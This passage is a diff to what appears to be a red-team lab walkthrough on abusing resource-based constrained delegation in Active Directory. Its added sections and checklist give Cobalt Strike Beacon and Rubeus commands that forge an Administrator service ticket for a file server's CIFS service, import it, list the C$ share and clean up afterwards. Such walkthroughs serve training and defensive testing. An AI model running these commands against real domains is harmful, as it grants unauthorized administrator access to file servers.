@@ -77,11 +77,17 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user
 # Keep the final Administrator -> cifs/lon-fs-1 ticket.
 ```
 
+```shell
+# OPSEC Alternative
+beacon> krb_s4u /ticket:<WKSTN1_TGT_BASE64> /service:cifs/lon-fs-1 /impersonateuser:Administrator /dc:lon-dc-1
+```
+
 ## Use the resulting service ticket
 
 Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.
 
 ```shell
+# Rubeus Alternative
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
 # Record ProcessID and verify that ticket import succeeded.
 beacon> steal_token <PID>
@@ -93,13 +99,29 @@ beacon> ls \\lon-fs-1\c$
 
 A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.
 
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token CONTOSO\Administrator FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
+beacon> run klist
+beacon> ls \\lon-fs-1\c$
+```
+
 ## Session cleanup
 
 Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.
 
 ```shell
+# Native cleanup
 beacon> kerberos_ticket_purge
 beacon> rev2self
+# Rubeus createnetonly path only:
 beacon> kill <PID>
 ```
 
@@ -130,6 +152,42 @@ Restoring the attribute stops the newly configured delegation path but does not 
 | Wrong client TGT | Use the newly authorized front end, not an unrelated host |
 | Existing delegation disappears | The setter replaced the list; restore the saved original configuration |
 | PowerShell command missing | PowerView versus ActiveDirectory module and their distinct command sets |
+
+## Quick checklist
+
+```text
+ENUMERATE AND PRESERVE
+[ ] Identify effective write access to the target's msDS-AllowedToActOnBehalfOfOtherIdentity.
+[ ] Resolve the ACE trustee and verify the current identity's actual group membership and rights.
+[ ] Confirm control of a front-end principal with an SPN and usable TGT.
+[ ] Read the target's existing allowed principals and save the original security descriptor.
+[ ] Preserve all existing entries when adding the controlled principal.
+[ ] Re-read the attribute and verify the intended change.
+
+REQUEST THE BACK-END TICKET
+[ ] Extract the TGT of the newly authorized front end: LON-WKSTN-1$ in this lab.
+[ ] krb_s4u /ticket:<WKSTN1_TGT_BASE64> /service:cifs/lon-fs-1 /impersonateuser:Administrator /dc:lon-dc-1
+[ ] Rubeus alternative: s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:<WKSTN1_TGT_BASE64> /dc:lon-dc-1 /nowrap.
+[ ] Keep the final Administrator -> cifs/lon-fs-1 service ticket.
+
+IMPORT AND VERIFY — CHOOSE ONE PATH
+# OPSEC Alternative
+[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
+[ ] make_token CONTOSO\Administrator FakePass
+[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
+# Rubeus Alternative
+[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
+[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
+[ ] run klist -> verify the selected session, client identity, target and expiry.
+[ ] ls \\lon-fs-1\c$ -> verify actual service authorization.
+
+CLEANUP
+[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
+[ ] rev2self -> restore the original token.
+[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
+[ ] Restore the original RBCD attribute, or clear it only if originally unset.
+[ ] Re-read allowed principals and verify that existing delegation was preserved.
+```
 
 ## Related references
 
